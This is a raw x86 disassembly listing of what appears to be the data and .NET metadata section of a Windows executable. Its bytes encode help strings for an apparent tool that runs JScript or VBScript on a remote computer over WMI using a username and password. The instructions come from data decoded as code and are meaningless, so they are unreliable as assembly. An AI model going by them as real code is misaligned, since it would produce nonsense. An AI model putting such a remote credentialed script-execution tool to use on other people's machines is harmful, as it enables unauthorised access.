  403405:	and    BYTE PTR ds:0x63534a20,ch
  40340b:	jb     0x403476
  40340d:	jo     0x403483
  40340f:	add    DWORD PTR [esi+0x9],ecx
  403412:	and    BYTE PTR [edi],ch
  403414:	dec    ebp
  403415:	and    BYTE PTR [ecx*2+0x69686361],bh
  40341c:	outs   dx,BYTE PTR ds:[esi]
  40341d:	gs and BYTE PTR ds:[ecx],cl
  403421:	and    BYTE PTR [ecx],cl
  403423:	and    BYTE PTR [ecx],cl
  403425:	and    BYTE PTR [edx+0x65],dl
  403428:	ins    DWORD PTR es:[edi],dx
  403429:	outs   dx,DWORD PTR ds:[esi]
  40342a:	je     0x403491
  40342c:	and    BYTE PTR [ebx+0x6f],ah
  40342f:	ins    DWORD PTR es:[edi],dx
  403430:	jo     0x4034a7
  403432:	je     0x403499
  403434:	jb     0x403456
  403436:	je     0x4034a7
  403438:	and    BYTE PTR [ebx+0x6f],ah
  40343b:	outs   dx,BYTE PTR ds:[esi]
  40343c:	outs   dx,BYTE PTR ds:[esi]
  40343d:	arpl   WORD PTR gs:[esi+ebp*1+0x20],si
  403442:	inc    esp
  403443:	gs popaw 
  403446:	jne    0x4034b4
  403448:	je     0x4034bd
  40344a:	and    BYTE PTR [edi+ebp*2+0x20],dh
  40344e:	je     0x4034b8
  403450:	and    BYTE PTR gs:[edi+ebp*2+0x63],ch
  403455:	popa   
  403456:	ins    BYTE PTR es:[edi],dx
  403457:	and    BYTE PTR [ebp+0x61],ch
  40345a:	arpl   WORD PTR [eax+0x69],bp
  40345d:	outs   dx,BYTE PTR ds:[esi]
  40345e:	add    DWORD PTR gs:[eax],ebx
  403461:	or     DWORD PTR [ecx],ecx
  403463:	or     DWORD PTR [ecx],ecx
  403465:	or     DWORD PTR [ecx],ecx
  403467:	and    BYTE PTR [ebp+0x43],cl
  40346a:	and    BYTE PTR ds:0x6e614d20,ch
  403470:	popa   
  403471:	gs and BYTE PTR fs:[bp+di+0x2b],al
  403477:	sub    ecx,DWORD PTR [edx]
  403479:	add    DWORD PTR ds:0x6f727245,ebp
  40347f:	jb     0x4034a2
  403481:	and    DWORD PTR [ecx],esp
  403483:	and    DWORD PTR [esi],ebp
  403485:	and    BYTE PTR [ecx+0x6f],bl
  403488:	jne    0x4034aa
  40348a:	jae    0x4034f4
  40348c:	outs   dx,DWORD PTR ds:[esi]
  40348d:	jne    0x4034fb
  40348f:	and    BYTE PTR fs:[ebx+0x70],dh
  403493:	arpl   WORD PTR gs:[ecx+0x66],bp
  403497:	jns    0x4034b9
  403499:	je     0x403503
  40349b:	and    BYTE PTR gs:[ebx+0x6c],ah
  40349f:	popa   
  4034a0:	jae    0x403515
  4034a2:	and    BYTE PTR [esi+0x61],ch
  4034a5:	ins    DWORD PTR es:[edi],dx
  4034a6:	gs add DWORD PTR cs:[edi],eax
  4034aa:	outs   dx,DWORD PTR ds:[esi]
  4034ab:	jo     0x403521
  4034ad:	imul   ebp,DWORD PTR [edi+0x6e],0x91d0173
  4034b4:	and    BYTE PTR [edi],ch
  4034b6:	push   eax
  4034b7:	push   edi
  4034b8:	and    BYTE PTR [eax+edx*2],bh
  4034bb:	popa   
  4034bc:	jae    0x403531
  4034be:	ja     0x40352f
  4034c0:	jb     0x403526
  4034c2:	and    BYTE PTR ds:[ecx],cl
  4034c5:	and    BYTE PTR [ecx],cl
  4034c7:	and    BYTE PTR [eax+0x61],dl
  4034ca:	jae    0x40353f
  4034cc:	ja     0x40353d
  4034ce:	jb     0x403534
  4034d0:	add    DWORD PTR ds:0x3f2f2009,esp
  4034d6:	or     DWORD PTR [ecx],ecx
  4034d8:	and    BYTE PTR [ecx],cl
  4034da:	and    BYTE PTR [ecx],cl
  4034dc:	and    BYTE PTR [ecx+ebp*2+0x73],al
  4034e0:	jo     0x40354e
  4034e2:	popa   
  4034e3:	jns    0x403558
  4034e5:	and    BYTE PTR [eax+ebp*2+0x69],dh
  4034e9:	jae    0x40350b
  4034eb:	push   0x20706c65
  4034f0:	jae    0x403555
  4034f2:	jb     0x403559
  4034f4:	outs   dx,BYTE PTR gs:[esi]
  4034f6:	or     al,BYTE PTR [ecx]
  4034f8:	adc    al,BYTE PTR [esi+0x69]
  4034fb:	ins    BYTE PTR es:[edi],dx
  4034fc:	and    BYTE PTR gs:[esi+0x61],ch
  403500:	ins    DWORD PTR es:[edi],dx
  403501:	and    BYTE PTR gs:[edi+ebp*2+0x6f],dh
  403506:	and    BYTE PTR [edi+ebp*2+0x6e],ch
  40350a:	add    DWORD PTR [bp+di],ebx
  40350d:	or     DWORD PTR [eax],esp
  40350f:	das    
  403510:	push   ebp
  403511:	and    BYTE PTR [edx*2+0x3e726573],bh
  403518:	and    BYTE PTR [ecx],cl
  40351a:	and    BYTE PTR [ecx],cl
  40351c:	and    BYTE PTR [ecx],cl
  40351e:	and    BYTE PTR [ebp+0x73],dl
  403521:	gs jb  0x403544
  403524:	outs   dx,BYTE PTR ds:[esi]
  403525:	popa   
  403526:	ins    DWORD PTR es:[edi],dx
  403527:	add    DWORD PTR gs:[eax],ebx
  40352a:	or     DWORD PTR [ecx],ecx
  40352c:	or     DWORD PTR [ecx],ecx
  40352e:	or     DWORD PTR [ecx],ecx
  403530:	and    BYTE PTR [esi+0x42],dl
  403533:	and    BYTE PTR ds:0x73695620,ch
  403539:	jne    0x40359c
  40353b:	ins    BYTE PTR es:[edi],dx
  40353c:	and    BYTE PTR [edx+0x61],al
  40353f:	jae    0x4035aa
  403541:	arpl   WORD PTR [ecx],ax
  403543:	pop    es
  403544:	push   esi
  403545:	gs jb  0x4035bb
  403548:	imul   ebp,DWORD PTR [edi+0x6e],0x9091601
  40354f:	or     DWORD PTR [ecx],ecx
  403551:	or     DWORD PTR [ecx],ecx
  403553:	and    BYTE PTR [esi+0x4a],dl
  403556:	and    BYTE PTR ds:0x68534a20,ch
  40355c:	popa   
  40355d:	jb     0x4035cf
  40355f:	sub    BYTE PTR [edx+0x23],cl
  403562:	sub    DWORD PTR [ecx],eax
  403564:	push   edx
  403565:	or     DWORD PTR [eax],esp
  403567:	das    
  403568:	dec    esi
  403569:	and    BYTE PTR [edi+edx*2],bh
  40356c:	dec    ebp
  40356d:	dec    ecx
  40356e:	dec    esi
  40356f:	popa   
  403570:	ins    DWORD PTR es:[edi],dx
  403571:	gs jae 0x4035e4
  403574:	popa   
  403575:	arpl   WORD PTR [ebp+0x3e],sp
  403578:	and    BYTE PTR [ecx],cl
  40357a:	and    BYTE PTR [ecx],cl
  40357c:	and    BYTE PTR [edi+0x4d],dl
  40357f:	dec    ecx
  403580:	and    BYTE PTR [esi+0x61],ch
  403583:	ins    DWORD PTR es:[edi],dx
  403584:	gs jae 0x4035f7
  403587:	popa   
  403588:	arpl   WORD PTR [ebp+0x20],sp
  40358b:	arpl   WORD PTR [edi+0x6e],bp
  40358e:	je     0x4035f1
  403590:	imul   ebp,DWORD PTR [esi+0x69],0x7420676e
  403597:	push   0x6c632065
  40359c:	popa   
  40359d:	jae    0x403612
  40359f:	and    BYTE PTR cs:[ebp+eiz*2+0x66],al
  4035a4:	popa   
  4035a5:	jne    0x403613
  4035a7:	je     0x40361c
  4035a9:	and    BYTE PTR [edi+ebp*2+0x20],dh
  4035ad:	jb     0x40361e
  4035af:	outs   dx,DWORD PTR ds:[esi]
  4035b0:	je     0x40360e
  4035b2:	arpl   WORD PTR [ecx+0x6d],bp
  4035b5:	jbe    0x4035e9
  4035b7:	add    BYTE PTR [edx+0x53],al
  4035ba:	dec    edx
  4035bb:	inc    edx
  4035bc:	add    DWORD PTR [eax],eax
  4035be:	add    DWORD PTR [eax],eax
  4035c0:	add    BYTE PTR [eax],al
  4035c2:	add    BYTE PTR [eax],al
  4035c4:	or     al,0x0
  4035c6:	add    BYTE PTR [eax],al
  4035c8:	jbe    0x4035fe
  4035ca:	xor    BYTE PTR cs:[esi],ch
  4035cd:	xor    esi,DWORD PTR [eax]
  4035cf:	xor    esi,DWORD PTR [ecx]
  4035d1:	cmp    DWORD PTR [eax],eax
  4035d3:	add    BYTE PTR [eax],al
  4035d5:	add    BYTE PTR ds:0x6c00,al
  4035db:	add    ah,al
  4035dd:	or     al,0x0
  4035df:	add    BYTE PTR [ebx],ah
  4035e1:	jle    0x4035e3
  4035e3:	add    BYTE PTR [eax],dh
  4035e5:	or     eax,0x11f00000
  4035ea:	add    BYTE PTR [eax],al
  4035ec:	and    edx,DWORD PTR [ebx+0x74]
  4035ef:	jb     0x40365a
  4035f1:	outs   dx,BYTE PTR ds:[esi]
  4035f2:	addr16 jae 0x4035f5
  4035f5:	add    BYTE PTR [eax],al
  4035f7:	add    BYTE PTR [eax],ah
  4035f9:	pop    ds
  4035fa:	add    BYTE PTR [eax],al
  4035fc:	pop    esp
  4035fd:	add    al,0x0
  4035ff:	add    BYTE PTR [ebx],ah
  403601:	push   ebp
  403602:	push   ebx
  403603:	add    BYTE PTR [ebx+eiz*1+0x0],bh
  403607:	add    BYTE PTR [eax],dl
  403609:	add    BYTE PTR [eax],al
  40360b:	add    BYTE PTR [ebx],ah
  40360d:	inc    edi
  40360e:	push   ebp
  40360f:	dec    ecx
  403610:	inc    esp
  403611:	add    BYTE PTR [eax],al
  403613:	add    BYTE PTR [ebx+eiz*1+0x36940000],cl
  40361a:	add    BYTE PTR [eax],al
  40361c:	and    eax,DWORD PTR [edx+0x6c]
  40361f:	outs   dx,DWORD PTR ds:[esi]
  403620:	bound  eax,QWORD PTR [eax]
  403622:	add    BYTE PTR [eax],al
  403624:	add    BYTE PTR [eax],al
  403626:	add    BYTE PTR [eax],al
  403628:	add    al,BYTE PTR [eax]
  40362a:	add    BYTE PTR [ecx],al
  40362c:	push   edi
  40362d:	pop    ebp
  40362e:	mov    ds:0xb0915,al
  403633:	add    BYTE PTR [eax],al
  403635:	cli    
  403636:	and    eax,0x160033
  40363b:	add    BYTE PTR [ecx],al
  40363d:	add    BYTE PTR [eax],al
  40363f:	add    BYTE PTR [ebx],bh
  403641:	add    BYTE PTR [eax],al
  403643:	add    BYTE PTR [edx],cl
  403645:	add    BYTE PTR [eax],al
  403647:	add    BYTE PTR [esi+0x0],dh
  40364a:	add    BYTE PTR [eax],al
  40364c:	sbb    DWORD PTR [eax],eax
  40364e:	add    BYTE PTR [eax],al
  403650:	adc    DWORD PTR [eax],eax
  403652:	add    BYTE PTR [eax],al
  403654:	pop    esp
  403655:	add    BYTE PTR [eax],al
  403657:	add    BYTE PTR [ecx+0x0],ch
  40365a:	add    BYTE PTR [eax],al
  40365c:	push   ss
  40365d:	add    BYTE PTR [eax],al
  40365f:	add    BYTE PTR [ecx],al
  403661:	add    BYTE PTR [eax],al
  403663:	add    BYTE PTR [edi],al
  403665:	add    BYTE PTR [eax],al
  403667:	add    BYTE PTR [edx],al
  403669:	add    BYTE PTR [eax],al
  40366b:	add    BYTE PTR [ebx],al
  40366d:	add    BYTE PTR [eax],al
  40366f:	add    BYTE PTR [ebx],al
  403671:	add    BYTE PTR [eax],al
  403673:	add    BYTE PTR [ecx],al
  403675:	add    BYTE PTR [eax],al
  403677:	add    BYTE PTR [ecx],al
  403679:	add    BYTE PTR [eax],al
  40367b:	add    BYTE PTR [ecx],al
  40367d:	add    BYTE PTR [eax],al
  40367f:	add    BYTE PTR [ebx],al
  403681:	add    BYTE PTR [eax],al
  403683:	add    BYTE PTR [ecx],al
  403685:	add    BYTE PTR [eax],al
  403687:	add    BYTE PTR [edx],al
  403689:	add    BYTE PTR [eax],al
  40368b:	add    BYTE PTR [ecx],al
  40368d:	add    BYTE PTR [eax],al
  40368f:	add    BYTE PTR [eax],al
  403691:	add    BYTE PTR [edx],cl
  403693:	add    BYTE PTR [ecx],al
  403695:	add    BYTE PTR [eax],al
  403697:	add    BYTE PTR [eax],al
  403699:	add    BYTE PTR [esi],al
  40369b:	add    bl,cl
  40369d:	add    ah,al
  40369f:	add    BYTE PTR [edx],cl
  4036a1:	add    al,ch
  4036a3:	add    dl,dl
  4036a5:	add    BYTE PTR [edx],cl
  4036a7:	add    ch,bh
  4036a9:	add    dl,dl
  4036ab:	add    BYTE PTR [esi],al
  4036ad:	add    BYTE PTR [eax+0x1],ah
  4036b0:	dec    edi
  4036b1:	add    DWORD PTR [esi],eax
  4036b3:	add    BYTE PTR [ecx+eax*1+0xe0177],cl
  4036ba:	les    eax,FWORD PTR [ecx]
  4036bc:	mov    dl,0x1
  4036be:	push   cs
  4036bf:	add    cl,ch
  4036c1:	add    DWORD PTR [edx+0x46000601],esi
  4036c7:	add    ch,BYTE PTR [ecx]
  4036c9:	add    al,BYTE PTR [esi]
  4036cb:	add    BYTE PTR [ebp+0xa],bh
  4036ce:	pop    esi
  4036cf:	or     al,BYTE PTR [esi]
  4036d1:	add    BYTE PTR [ebx+0x600c40a],dh
  4036d7:	add    ah,dl
  4036d9:	or     bl,BYTE PTR [esi+0xa]
  4036dc:	push   es
  4036dd:	add    al,ch
  4036df:	or     al,ah
  4036e1:	add    BYTE PTR [esi],al
  4036e3:	add    BYTE PTR [eax],dl
  4036e5:	or     edi,esi
  4036e7:	or     al,BYTE PTR [esi]
  4036e9:	add    BYTE PTR [edi],ah
  4036eb:	or     edi,esi
  4036ed:	or     al,BYTE PTR [esi]
  4036ef:	add    BYTE PTR [ebx+ecx*1-0x2],al
  4036f3:	or     al,BYTE PTR [esi]
  4036f5:	add    BYTE PTR [edx+0xb],ah
  4036f8:	dec    BYTE PTR [edx]
  4036fa:	push   es
  4036fb:	add    BYTE PTR [ebx+0xb],bh
  4036fe:	dec    BYTE PTR [edx]
  403700:	push   es
  403701:	add    BYTE PTR [ebx+ecx*1+0x60afe],dl
  403708:	scas   eax,DWORD PTR es:[edi]
  403709:	or     edi,esi
  40370b:	or     al,BYTE PTR [esi]
  40370d:	add    al,cl
  40370f:	or     edi,esi
  403711:	or     al,BYTE PTR [esi]
  403713:	add    ch,ah
  403715:	or     edi,esi
  403717:	or     al,BYTE PTR [esi]
  403719:	add    BYTE PTR [ebx],cl
  40371b:	or     al,0x4f
  40371d:	add    DWORD PTR [esi],eax
  40371f:	add    BYTE PTR ds:0x6014f0c,ch
  403725:	add    BYTE PTR [edi+0xc],cl
  403728:	dec    BYTE PTR [edx]
  40372a:	push   es
  40372b:	add    BYTE PTR [edx+0xc],ch
  40372e:	dec    BYTE PTR [edx]
  403730:	push   es
  403731:	add    BYTE PTR [ebx+0x60afe0c],al
  403737:	add    cl,al
  403739:	or     al,0xa1
  40373b:	or     al,0x6
  40373d:	add    bl,bh
  40373f:	or     al,0xdf
  403741:	or     al,0x6
  403743:	add    BYTE PTR [edi],dl
  403745:	or     eax,0x60cdf
  40374a:	cmp    DWORD PTR ds:0x7b0d26,ecx
  403750:	dec    ebp
  403751:	or     eax,0x60000
  403756:	pop    esp
  403757:	or     eax,0x60ca1
  40375c:	jl     0x40376b
  40375e:	dec    BYTE PTR [edx]
  403760:	push   es
  403761:	add    BYTE PTR [edx+0x60afe0d],bl
  403767:	add    BYTE PTR [eax+0xa00c40d],bh
  40376d:	add    dl,cl
  40376f:	or     eax,0x60d26
  403774:	adc    BYTE PTR [esi],cl
  403776:	les    eax,FWORD PTR [eax]
  403778:	push   es
  403779:	add    BYTE PTR [esi],bl
  40377b:	push   cs
  40377c:	les    eax,FWORD PTR [eax]
  40377e:	push   es
  40377f:	add    BYTE PTR [esi+ecx*1+0x43],dl
  403783:	push   cs
  403784:	push   es
  403785:	add    ah,bl
  403787:	push   cs
  403788:	les    eax,FWORD PTR [eax]
  40378a:	push   es
  40378b:	add    BYTE PTR [esi],cl
  40378d:	(bad)  
  40378f:	clts   
  403791:	add    BYTE PTR [edi],bl
  403793:	(bad)  
  403795:	femms  
  403797:	add    BYTE PTR [edi+ecx*1],dh
  40379a:	mov    dl,0x1
  40379c:	push   cs
  40379d:	add    BYTE PTR [esi+0xf],ch
  4037a0:	mov    dl,0x1
  4037a2:	push   cs
  4037a3:	add    BYTE PTR [ebp+0xe01b20f],dh
  4037a9:	add    bh,bl
  4037ab:	lss    eax,FWORD PTR [ecx]
  4037ae:	push   cs
  4037af:	add    bh,ch
  4037b1:	lss    eax,FWORD PTR [ecx]
  4037b4:	push   cs
  4037b5:	add    BYTE PTR [edx],dl
  4037b7:	adc    BYTE PTR [edx+0x26000e01],dh
  4037bd:	adc    BYTE PTR [edx+0x45000601],dh
  4037c3:	adc    ah,al
  4037c5:	add    BYTE PTR [esi],al
  4037c7:	add    BYTE PTR [eax+0x10],bl
  4037ca:	sub    DWORD PTR [edx],eax
  4037cc:	push   es
  4037cd:	add    BYTE PTR [edx+0x6022910],al
  4037d3:	add    BYTE PTR [edi+0x610a310],ch
  4037d9:	add    cl,dh
  4037db:	adc    BYTE PTR [esi+0xa],bl
  4037de:	push   es
  4037df:	add    BYTE PTR [esi],dl
  4037e1:	adc    esp,eax
  4037e3:	add    BYTE PTR [esi],al
  4037e5:	add    BYTE PTR [esi],ch
  4037e7:	adc    esp,eax
  4037e9:	add    BYTE PTR [esi],al
  4037eb:	add    BYTE PTR [ecx+0x11],ch
  4037ee:	inc    ebx
  4037ef:	push   cs
  4037f0:	push   es
  4037f1:	add    BYTE PTR [eax+0x600c411],bl
  4037f7:	add    BYTE PTR [edi+0x11af11],bh
  4037fd:	add    BYTE PTR [eax],al
  4037ff:	add    BYTE PTR [ecx],al
  403801:	add    BYTE PTR [eax],al
  403803:	add    BYTE PTR [eax],al
  403805:	add    BYTE PTR [ecx],al
  403807:	add    BYTE PTR [ecx],al
  403809:	add    BYTE PTR [eax],al
  40380b:	add    BYTE PTR [eax],dl
  40380d:	add    BYTE PTR [ebx],bl
  40380f:	add    BYTE PTR [edi],ah
  403811:	add    BYTE PTR ds:0x1000100,al
  403817:	add    BYTE PTR [ebx],al
  403819:	add    BYTE PTR [eax],dl
  40381b:	add    BYTE PTR [eax+0x0],al
  40381e:	add    BYTE PTR [eax],al
  403820:	add    eax,0x8000900
  403825:	add    BYTE PTR ds:0x4e001000,al
  40382b:	add    BYTE PTR [eax],al
  40382d:	add    BYTE PTR ds:0xb000b00,al
  403833:	add    BYTE PTR [eax+0x5c001001],al
  403839:	add    BYTE PTR [eax],al
  40383b:	add    BYTE PTR ds:0xd000b00,al
  403841:	add    BYTE PTR [eax+0x67001001],al
  403847:	add    BYTE PTR [eax],al
  403849:	add    BYTE PTR ds:0xd000c00,al
  40384f:	add    BYTE PTR [eax+0x74001001],al
  403855:	add    BYTE PTR [eax],al
  403857:	add    BYTE PTR ds:0xd001500,al
  40385d:	add    BYTE PTR [eax],al
  40385f:	add    DWORD PTR [eax],edx
  403861:	add    BYTE PTR [eax+0x9009700],al
  403867:	add    BYTE PTR [edx+0x0],bl
  40386a:	or     eax,0x10010000
  40386f:	add    BYTE PTR [eax+eax*1+0xd0097],ah
  403876:	pop    ebx
  403877:	add    BYTE PTR [edi],cl
  403879:	add    BYTE PTR [eax],al
  40387b:	add    DWORD PTR [eax],edx
  40387d:	add    BYTE PTR [eax+0x5009700],bh
  403883:	add    BYTE PTR [ebx+0x0],bl
  403886:	adc    DWORD PTR [eax],eax
  403888:	adc    DWORD PTR [eax],eax
  40388a:	adc    eax,0x11000e01
  40388f:	add    BYTE PTR [ecx+eax*1],bl
  403892:	push   cs
  403893:	add    BYTE PTR [ecx],dl
  403895:	add    BYTE PTR [ecx],ch
  403897:	add    DWORD PTR [esi],ecx
  403899:	add    BYTE PTR [ecx],dl
  40389b:	add    BYTE PTR [ebx],dh
  40389d:	add    DWORD PTR [esi],ecx
  40389f:	add    BYTE PTR [ecx],dl
  4038a1:	add    BYTE PTR [ecx+eax*1],bh
  4038a4:	adc    DWORD PTR [eax],eax
  4038a6:	adc    DWORD PTR [eax],eax
  4038a8:	inc    ebp
  4038a9:	add    DWORD PTR [esi],ecx
  4038ab:	add    BYTE PTR [ecx],dl
  4038ad:	add    BYTE PTR [eax+0x1],dh
  4038b0:	adc    eax,0x98001100
  4038b5:	add    DWORD PTR [ecx],ebx
  4038b7:	add    BYTE PTR [ecx],al
  4038b9:	add    BYTE PTR [ebx],bl
  4038bb:	add    al,BYTE PTR [esi+0x0]
  4038be:	add    DWORD PTR [eax],eax
  4038c0:	dec    edi
  4038c1:	add    cl,BYTE PTR [edx+0x0]
  4038c4:	push   ebx
  4038c5:	sub    BYTE PTR [esi+0x2],0xe
  4038c9:	add    BYTE PTR [ebx-0x80],dl
  4038cc:	jbe    0x4038d0
  4038ce:	push   cs
  4038cf:	add    BYTE PTR [ebx-0x80],dl
  4038d2:	jl     0x4038d6
  4038d4:	push   cs
  4038d5:	add    BYTE PTR [ebx-0x80],dl
  4038d8:	mov    BYTE PTR [edx],al
  4038da:	push   cs
  4038db:	add    BYTE PTR [ebx-0x80],dl
  4038de:	xchg   ebp,eax
  4038df:	add    cl,BYTE PTR [esi]
  4038e1:	add    BYTE PTR [ebx-0x80],dl
  4038e4:	outs   dx,BYTE PTR ds:[esi]
  4038e5:	add    cl,BYTE PTR [esi]
  4038e7:	add    BYTE PTR [ebx-0x80],dl
  4038ea:	lahf   
  4038eb:	add    cl,BYTE PTR [esi]
  4038ed:	add    BYTE PTR [ebx-0x80],dl
  4038f0:	mov    ah,0x2
  4038f2:	push   cs
  4038f3:	add    BYTE PTR [ebx-0x80],dl
  4038f6:	enter  0xe02,0x0
  4038fa:	push   ebx
  4038fb:	sbb    cl,0x2
  4038fe:	sbb    DWORD PTR [ecx],eax
  403900:	push   ebx
  403901:	sub    dl,0x2
  403904:	push   cs
  403905:	add    BYTE PTR [ebx-0x80],dl
  403908:	clc    
  403909:	add    cl,BYTE PTR [esi]
  40390b:	add    BYTE PTR [ebx-0x80],dl
  40390e:	or     eax,DWORD PTR [ebx]
  403910:	push   cs
  403911:	add    BYTE PTR [ebx-0x80],dl
  403914:	sbb    eax,0x53000e03
  403919:	xor    BYTE PTR [edx],0x3
  40391c:	push   cs
  40391d:	add    BYTE PTR [ebx-0x80],dl
  403920:	dec    esp
  403921:	add    ecx,DWORD PTR [esi]
  403923:	add    BYTE PTR [ebx-0x80],dl
  403926:	add    ecx,DWORD PTR gs:[esi]
  403929:	add    BYTE PTR [ebx-0x80],dl
  40392c:	add    BYTE PTR [ebx],0xe
  40392f:	add    BYTE PTR [ebx-0x80],dl
  403932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403933:	add    ecx,DWORD PTR [esi]
  403935:	add    BYTE PTR [ebx-0x80],dl
  403938:	lds    eax,FWORD PTR [ebx]
  40393a:	push   cs
  40393b:	add    BYTE PTR [ebx-0x80],dl
  40393e:	xlat   BYTE PTR ds:[ebx]
  40393f:	add    ecx,DWORD PTR [esi]
  403941:	add    BYTE PTR [ebx-0x80],dl
  403944:	out    dx,al
  403945:	add    ecx,DWORD PTR [esi]
  403947:	add    BYTE PTR [ebx-0x80],dl
  40394a:	add    al,0x4
  40394c:	push   cs
  40394d:	add    BYTE PTR [ebx-0x80],dl
  403950:	or     eax,0x53000e04
  403955:	sbb    BYTE PTR [eax],0x4
  403958:	push   cs
  403959:	add    BYTE PTR [ebx-0x80],dl
  40395c:	les    eax,FWORD PTR [eax]
  40395e:	push   cs
  40395f:	add    BYTE PTR [ebx-0x80],dl
  403962:	das    
  403963:	add    al,0xe
  403965:	add    BYTE PTR [ebx-0x80],dl
  403968:	cmp    al,BYTE PTR [esi+ecx*1]
  40396b:	add    BYTE PTR [ebx-0x80],dl
  40396e:	dec    ecx
  40396f:	add    al,0xe
  403971:	add    BYTE PTR [ebx-0x80],dl
  403974:	pop    edi
  403975:	add    al,0xe
  403977:	add    BYTE PTR [ebx-0x80],dl
  40397a:	jl     0x403980
  40397c:	push   cs
  40397d:	add    BYTE PTR [ebx-0x80],dl
  403980:	pop    DWORD PTR [esi+ecx*1]
  403983:	add    BYTE PTR [ebx-0x80],dl
  403986:	cdq    
  403987:	add    al,0xe
  403989:	add    BYTE PTR [ebx-0x80],dl
  40398c:	lods   al,BYTE PTR ds:[esi]
  40398d:	add    al,0xe
  40398f:	add    BYTE PTR [ebx-0x80],dl
  403992:	les    eax,FWORD PTR [esi+ecx*1]
  403995:	add    BYTE PTR [ebx-0x80],dl
  403998:	fild   DWORD PTR [esi+ecx*1]
  40399b:	add    BYTE PTR [ebx-0x80],dl
  40399e:	out    dx,al
  40399f:	add    al,0xe
  4039a1:	add    BYTE PTR [ebx-0x80],dl
  4039a4:	push   es
  4039a5:	add    eax,0x8053000e
  4039aa:	sbb    eax,0x53000e05
  4039af:	add    BYTE PTR [ecx+0x5],0xe
  4039b3:	add    BYTE PTR [ebx-0x80],dl
  4039b6:	push   ebp
  4039b7:	add    eax,0x8053000e
  4039bc:	jo     0x4039c3
  4039be:	push   cs
  4039bf:	add    BYTE PTR [ebx-0x80],dl
  4039c2:	add    DWORD PTR ds:0x8053000e,0xe058e
  4039cc:	push   ebx
  4039cd:	and    BYTE PTR [esi+0x53000e05],0x80
  4039d4:	mov    edx,0x53000e05
  4039d9:	or     al,0x5
  4039dc:	push   cs
  4039dd:	add    BYTE PTR [ebx-0x80],dl
  4039e0:	loope  0x4039e7
  4039e2:	push   cs
  4039e3:	add    BYTE PTR [ebx-0x80],dl
  4039e6:	repnz add eax,0x8053000e
  4039ec:	add    al,BYTE PTR [esi]
  4039ee:	push   cs
  4039ef:	add    BYTE PTR [ebx-0x80],dl
  4039f2:	adc    BYTE PTR [esi],al
  4039f4:	push   cs
  4039f5:	add    BYTE PTR [ebx-0x80],dl
  4039f8:	sub    BYTE PTR [esi],al
  4039fa:	push   cs
  4039fb:	add    BYTE PTR [ebx-0x80],dl
  4039fe:	push   ecx
  4039ff:	push   es
  403a00:	push   cs
  403a01:	add    BYTE PTR [ebx-0x80],dl
  403a04:	ins    DWORD PTR es:[edi],dx
  403a05:	push   es
  403a06:	push   cs
  403a07:	add    BYTE PTR [ebx-0x80],dl
  403a0a:	pop    DWORD PTR [esi]
  403a0c:	push   cs
  403a0d:	add    BYTE PTR [ebx-0x80],dl
  403a10:	sahf   
  403a11:	push   es
  403a12:	push   cs
  403a13:	add    BYTE PTR [ebx-0x80],dl
  403a16:	mov    ah,0x6
  403a18:	push   cs
  403a19:	add    BYTE PTR [ebx-0x80],dl
  403a1c:	leave  
  403a1d:	push   es
  403a1e:	push   cs
  403a1f:	add    BYTE PTR [ebx-0x80],dl
  403a22:	rol    DWORD PTR [esi],cl
  403a24:	push   cs
  403a25:	add    BYTE PTR [ebx-0x80],dl
  403a28:	jmp    0x53404833
  403a2d:	cmp    dh,0x6
  403a30:	push   cs
  403a31:	add    BYTE PTR [ebx-0x80],dl
  403a34:	sbb    DWORD PTR [edi],eax
  403a36:	push   cs
  403a37:	add    BYTE PTR [ebx-0x80],dl
  403a3a:	das    
  403a3b:	pop    es
  403a3c:	push   cs
  403a3d:	add    BYTE PTR [ebx-0x80],dl
  403a40:	inc    ebx
  403a41:	pop    es
  403a42:	push   cs
  403a43:	add    BYTE PTR [ebx-0x80],dl
  403a46:	pop    ebp
  403a47:	pop    es
  403a48:	push   cs
  403a49:	add    BYTE PTR [ebx-0x80],dl
  403a4c:	ins    DWORD PTR es:[edi],dx
  403a4d:	pop    es
  403a4e:	push   cs
  403a4f:	add    BYTE PTR [ebx-0x80],dl
  403a52:	mov    DWORD PTR [edi],eax
  403a54:	push   cs
  403a55:	add    BYTE PTR [ebx-0x80],dl
  403a58:	call   0xac80:0x53000e07
  403a5f:	pop    es
  403a60:	push   cs
  403a61:	add    BYTE PTR [ebx-0x80],dl
  403a64:	mov    eax,0x53000e07
  403a69:	or     dh,0x7
  403a6c:	push   cs
  403a6d:	add    BYTE PTR [ebx-0x80],dl
  403a70:	lock pop es
  403a72:	push   cs
  403a73:	add    BYTE PTR [ebx-0x80],dl
  403a76:	add    al,0x8
  403a78:	push   cs
  403a79:	add    BYTE PTR [ebx-0x80],dl
  403a7c:	sbb    al,0x8
  403a7e:	push   cs
  403a7f:	add    BYTE PTR [ebx-0x80],dl
  403a82:	xor    cl,BYTE PTR [eax]
  403a84:	push   cs
  403a85:	add    BYTE PTR [ebx-0x80],dl
  403a88:	inc    esi
  403a89:	or     BYTE PTR [esi],cl
  403a8b:	add    BYTE PTR [ebx-0x80],dl
  403a8e:	pop    edi
  403a8f:	or     BYTE PTR [esi],cl
  403a91:	add    BYTE PTR [ebx-0x80],dl
  403a94:	jb     0x403a9e
  403a96:	push   cs
  403a97:	add    BYTE PTR [ebx-0x80],dl
  403a9a:	mov    WORD PTR [eax],cs
  403a9c:	push   cs
  403a9d:	add    BYTE PTR [ecx],al
  403a9f:	add    BYTE PTR [ebp+0x532c7708],bl
  403aa5:	or     cl,0x8
  403aa8:	push   cs
  403aa9:	add    BYTE PTR [ebx-0x80],dl
  403aac:	ror    DWORD PTR [eax],1
  403aae:	push   cs
  403aaf:	add    BYTE PTR [ebx-0x80],dl
  403ab2:	fisttp WORD PTR [eax]
  403ab4:	push   cs
  403ab5:	add    BYTE PTR [ebx-0x80],dl
  403ab8:	out    dx,al
  403ab9:	or     BYTE PTR [esi],cl
  403abb:	add    BYTE PTR [ebx-0x80],dl
  403abe:	dec    DWORD PTR [eax]
  403ac0:	push   cs
  403ac1:	add    BYTE PTR [ebx-0x80],dl
  403ac4:	adc    ecx,DWORD PTR [ecx]
  403ac6:	push   cs
  403ac7:	add    BYTE PTR [ebx-0x80],dl
  403aca:	and    cl,BYTE PTR [ecx]
  403acc:	push   cs
  403acd:	add    BYTE PTR [ebx-0x80],dl
  403ad0:	sub    eax,0x53000e09
  403ad5:	cmp    BYTE PTR [eax],0x9
  403ad8:	push   cs
  403ad9:	add    BYTE PTR [ebx-0x80],dl
  403adc:	inc    ebp
  403add:	or     DWORD PTR [esi],ecx
  403adf:	add    BYTE PTR [ebx-0x80],dl
